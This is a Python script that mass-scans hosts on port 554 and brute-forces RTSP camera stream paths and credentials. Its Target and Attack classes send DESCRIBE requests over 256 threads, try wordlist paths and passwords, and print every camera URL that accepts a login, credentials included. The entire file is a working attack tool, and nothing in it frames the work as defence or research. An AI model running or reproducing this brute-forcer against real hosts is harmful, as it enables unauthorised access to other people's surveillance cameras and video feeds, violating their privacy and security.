#!/usr/bin/env python
from functools import partial
import os
import re
from socket import socket, timeout

from fire import Fire
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

# directories to work with
DIR = os.path.dirname(os.path.abspath(__file__))
LOCAL_DIR = os.path.join(DIR, 'local')
DATA_DIR = os.path.join(DIR, 'data')
CAPTURES_DIR = os.path.join(LOCAL_DIR, 'rtsp_captures')


class Target:
    protocol: str = 'rtsp'
    host: str
    port: str = '554'
    _status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')

    def __init__(self, host):
        port = self.port

        if ':' in host:
            host, port = host.split(':')

        self.host, self.port = host, port

    def __enter__(self):
        self._socket = socket()
        self._socket.settimeout(3)
        return self

    def __exit__(self, *_):
        self._socket.close()

    def query(self, path='', cred=''):
        from time import time
        url = self.get_url(path, cred)
        req = (
            f'DESCRIBE {url} RTSP/1.0\r\n'
            'CSeq: 2\r\n'
            # 'Accept: application/sdp\r\n'
            '\r\n'
        )

        response = ''
        code = 500
        t = time()

        conn_code = self._socket.connect_ex((self.host, int(self.port)))

        if conn_code == 0:

            try:
                self._socket.sendall(req.encode())
                response = self._socket.recv(1024).decode()
                rtsp_matches = self._status_re.findall(response)
                code = int(rtsp_matches[0]) if rtsp_matches else 500
            except ConnectionResetError:
                # code = 500
                pass
            except ConnectionRefusedError:
                # code = 500
                pass
            except BrokenPipeError:
                # code = 500
                pass
            except timeout:
                # idk what to do, but return 503
                # coz timed out host will produce
                # bad behavior for brute process
                pass

        return url, code, int((time() - t)*1000)

    def has_access(self, path: str = '', cred: str = ''):
        url, code, t = self.query(path, cred)
        return url, code == 200, code, t

    def has_path(self, path: str = ''):
        url, code, t = self.query(path)
        return url, code in [200, 401, 403], code, t

    def get_url(self, path='', cred=''):
        if cred:
            cred = f'{cred}@'
        return f'{self.protocol}://{cred}{self.host}:{self.port}{path}'


class Attack():
    def __init__(self, target: Target, paths: list, creds: list):
        self._target = target
        self._paths = paths
        self._creds = creds

    def __iter__(self):
        target = self._target

        last_cred = None

        for path in self._paths:
            url, ok, c, t = target.has_path(path)
            if c >= 500:
                # print(f'[{c}] {url}')
                return

            if not ok:
                continue

            # print('•', url)

            if last_cred:
                url, ok, c, t = target.has_access(path, last_cred)

                if c >= 500:
                    # print(f'[{c}] {url}')
                    return

                if ok:
                    yield url, t
                    break

            for cred in self._creds:
                if cred == last_cred:
                    continue

                url, ok, c, t = target.has_access(path, cred)

                # print(f'» [{c}] {cred}')

                if c >= 500:
                    # print(f'[{c}] {url}')
                    return
                if ok:
                    # print('Weeeeeee! =>', url)
                    yield url, t
                    last_cred = cred
                    break
            if not last_cred:
                return  # have no valid creds, giving up 4 now


def register(url):
    print(url)


def capture(url):
    if not os.path.exists(CAPTURES_DIR):
        os.mkdir(CAPTURES_DIR)
    pass


def process_host(paths, creds, host):
    results = []
    with Target(host) as target:
        for url, t in Attack(target, paths, creds):
            results.append((url, t))
    return results


def main(H=None, P=None, C=None):
    with open(P or os.path.join(DATA_DIR, 'rtsp_paths_my.txt')) as f:
        paths = [ln.rstrip() for ln in f]

    with open(C or os.path.join(DATA_DIR, 'rtsp_creds.txt')) as f:
        creds = [ln.rstrip() for ln in f]

    ph = partial(process_host, paths, creds)

    with open(H or os.path.join(LOCAL_DIR, 'hosts_554.txt')) as f:
        total = sum(1 for _ in f)
        f.seek(0)
        with ThreadPoolExecutor(256) as ex:
            hosts = (ln.rstrip() for ln in f)
            results = tqdm(ex.map(ph, hosts), total=total)
            for host_results in list(results):
                for url, t in host_results:
                    print(f'[C] {t:>4} ms {url}')


if __name__ == "__main__":
    Fire(main)
